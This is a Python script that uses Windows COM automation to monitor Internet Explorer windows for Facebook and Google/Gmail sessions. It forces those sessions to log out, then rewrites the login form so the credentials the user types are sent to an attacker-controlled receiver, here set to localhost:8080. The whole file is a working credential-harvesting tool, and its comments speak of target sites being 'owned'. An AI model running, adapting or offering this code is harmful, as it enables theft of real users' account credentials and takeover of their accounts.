import win32com.client
import urlparse
import urllib

# here we will receive the credentials from our target sites
from utils.browserutils import wait_for_browser

data_receiver = "http://localhost:8080/"

target_sites = {}

target_sites["www.facebook.com"] = {
    "logout_url" : None,
    "logout_form" : "logout_form",
    "login_form_index" : 0,
    "owned" : False
}

target_sites["accounts.google.com"] = {
    "logout_url" : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
    "logout_form" : None,
    "login_form_index" : 0,
    "owned" : False
}

# use the same target for multiple Gmail domains
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

# what is this for? Shell Windows component
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
#CLSID = pythoncom.MakeIID('{000208D5-0000-0000-C000-000000000046}')
'''
To use an IDispatch-based COM object, use the method win32com.client.Dispatch().
 This method takes as its first parameter the ProgID or CLSID of the object you wish to create.
If you read the documentation for Microsoft Excel, you'll find the ProgID for Excel is Excel.Application, 
so to create an object that interfaces to Excel, use the following code:
import win32com.client
xl = win32com.client.Dispatch("Excel.Application")
'''

windows = win32com.client.Dispatch(clsid)

while True:
    for browser in windows:
        url = urlparse.urlparse(browser.LocationUrl) #parse url into 6 components <scheme>://<netloc>/<path>;<params>?<query>#<fragment>

        if url.hostname in target_sites:

            # skip if already compromised
            if target_sites[url.hostname]["owned"]:
                continue

            # if there is a URL we can just redirect
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                #retrieve all elements in the document
                full_doc = browser.Document.all

                # iterate, looking for the logout form
                for i in full_doc:
                    try:
                        # find the logout form and submit it
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass

            # nodw se modify the login form
            try:
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
            except:
                pass